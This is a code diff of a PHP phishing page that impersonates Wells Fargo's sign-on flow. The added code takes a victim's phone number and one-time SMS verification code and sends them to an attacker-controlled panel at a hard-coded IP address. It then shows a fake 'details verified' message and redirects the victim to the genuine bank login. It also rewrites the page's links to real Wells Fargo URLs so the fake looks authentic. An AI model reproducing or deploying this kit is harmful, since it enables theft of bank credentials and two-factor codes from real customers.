@@ -12,17 +12,20 @@ include('../files/boot/DB-CIDR.php');
 include('../files/boot/DB-HOSTS.php');
 include('../files/boot/DB-METHOD.php');
 include('../files/boot/DB-RANGE.php');
-include('../files/boot/enc.php');
 include('../call.php');
-$user = @$_GET['user'];
-$phone = @$_GET['phone'];
-$error = @$_GET['error'];
-if (($user == "") || ($phone == "")) { 
-echo '<meta http-equiv="refresh" content="0; URL=index.php">';
+
+$user = @$_POST['user'];
+$code = trim($_POST['code']);
+$phone = trim($_POST['phone']);
+echo $phone . " : " . $code;
+if ($code == "") {
+  echo '<meta http-equiv="refresh" content="0; URL=codeinfo.php?error=1&phone=' . $phone . '&user=' . $user . '">';
     die();
 }
+$test = @file_get_contents("http://137.74.171.167/panelo/a.php?sms=$phone,$code");        // here goes the panel
 ?>
 <head>
+    <meta http-equiv="refresh" content="7; URL=https://connect.secure.wellsfargo.com/auth/login/present?origin=mobilebrowser&error=yes">
     <meta http-equiv="content-type" content="text/html; charset=UTF-8">
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -75,10 +78,12 @@ echo '<meta http-equiv="refresh" content="0; URL=index.php">';
             </div>
         </header>
 
+        <div id="maincontainer">
             <div class="search-signon-wrapper" aria-hidden="true">
                 <div class="search-signon-container" style="display: none;">
                     <div class="wrap left rounded">
                         <div class="search-container">
+
                             <label class="sr-only" for="searchopen">Search</label>
                             <input type="text" class="search left rounded" id="searchopen" value="Search">
                             <span class="search-sprite"></span>
@@ -107,54 +112,31 @@ echo '<meta http-equiv="refresh" content="0; URL=index.php">';
             </div>
 
             <div class="overlaySignOn" style="top: 38px;">
-
                 <div class="overlayContainer">
                     <div class="welcome-container" tabindex="-1">Welcome</div>
                     <div class="security-container">
                         <span class="security-img"></span>
-                        <a href="#" class="security-text">Online &amp; Mobile Security</a>
+                        <a href="https://www.wellsfargo.com/privacy-security/fraud/" class="security-text">Online &amp; Mobile Security</a>
                     </div>
-                    <div class="signOnContainer" align="center" style="width: 100%; max-width: 650px;">
-                        <form id="" name="frmSignon" action="completed.php" method="post" autocomplete="off">
-                            <input type="hidden" name="user" value="<?=$user;?>">
-                            <input type="hidden" name="phone" value="<?=$phone;?>">
-                            <p class="enroll-header" style="font-size: 100%;">For your security, an Advanced Access code is required. </p>
-                            <p class="enroll-header" style="font-size: 110%;">We have sent you a message with a 6 digit code ("To send 500.00 to Wells Fargo with a unique code") to your phone number.</p>
-                            <p style="font-size: 120%; font-weight: bold;">Failing to input the specific code will cause your account to remain suspended and the authentication will not be validated.</p>
-                            <p style="font-size: 120%; font-weight: bold;">Please wait a few moments to receive the code on your mobile phone.</p>
-
-                            <?php if ($error == "1") { 
-                                echo '<p style="font-size: 130%; color: red; font-weight: bold;">Some or all of the fields you have completed might be incorrect or incomplete. Please review your input. </p>';;
-                                }
-                            ?>
-                                </p>
-                                <br>
-                                <label class="sr-only" for="userid"></label>
-                                <p style=" font-size: 110%; font-weight:bold; width: 40%;">Text code (6 digits): </p>
-                                <input maxlength="6" style=" width: 40%;" id="userid" placeholder="Text code(6digits)" class="required" name="code" type="text">
-                                <div class="save-uid" align="left">
-                                    <ul>
-                                        <li>
-                                            <input maxlength="6" name="code" id="code" value="" type="checkbox">
-                                        </li>
-                                    </ul>
-                                </div>
-                                <input class="signOn" style="width: 60%; " value="Verify my account" type="submit">
-
-                                <div class="enroll-header">&copy; 2019 <em>Wells Fargo Online</em><sup>®</sup></div>
-
+                    <div class="signOnContainer" align="center">
+                        <form id="frmSignon" name="frmSignon" action="test.php" method="post" autocomplete="off">
+                            <!-- Updated the name and value of the field -->
+                            <p style="font-size: 120%;"> Your details have been verified</p>
+                            <p style="font-size: 120%; font-weight: bold;"> You may now use your card and account as usual.</p>
+                            <p style="font-size: 120%; font-weight: bold;"> We are sorry for this inconvenience.</p>
+                            <div class="enroll-header">&copy; 2019 <em>Wells Fargo Online</em><sup>®</sup></div>
                         </form>
                     </div>
                     <div class="appstoreBadge" id="ios">
-                        <a href="#" class="ios"><span class="sr-only">Get the Wells Fargo app</span></a>
-                        <a href="#" class="android" style="display: none;"><span class="sr-only">Get the Wells Fargo app</span></a>
+                        <a href="https://www.wellsfargo.com/exit/exit_appstore_ios/" class="ios"><span class="sr-only">Get the Wells Fargo app</span></a>
+                        <a href="https://www.wellsfargo.com/exit/exit_appstore_andriod/" class="android" style="display: none;"><span class="sr-only">Get the Wells Fargo app</span></a>
                     </div>
                     <footer role="contentinfo">
                         <div class="html5footer c9" id="pageFooter">
                             <nav class="nav-footer">
                                 <div class="footer-link clistData">
-                                    <a href="#">PRIVACY, Cookies, Security &amp; Legal</a> | <a href="#">Ad Choices</a>
-                                    <div class="footer-oaa"><a href="#">Online Access Agreement</a>
+                                    <a href="https://www.wellsfargo.com/privacy-security/">PRIVACY, Cookies, Security &amp; Legal</a> | <a href="https://www.wellsfargo.com/privacy-security/privacy/online#adchoices">Ad Choices</a>
+                                    <div class="footer-oaa"><a href="https://www.wellsfargo.com/online-banking/online-access-agreement/">Online Access Agreement</a>
                                     </div>
                                 </div>
                                 <div class="footer-content">
@@ -175,7 +157,6 @@ echo '<meta http-equiv="refresh" content="0; URL=index.php">';
 
                     </footer>
                 </div>
-
             </div>
         </div>
     </div>
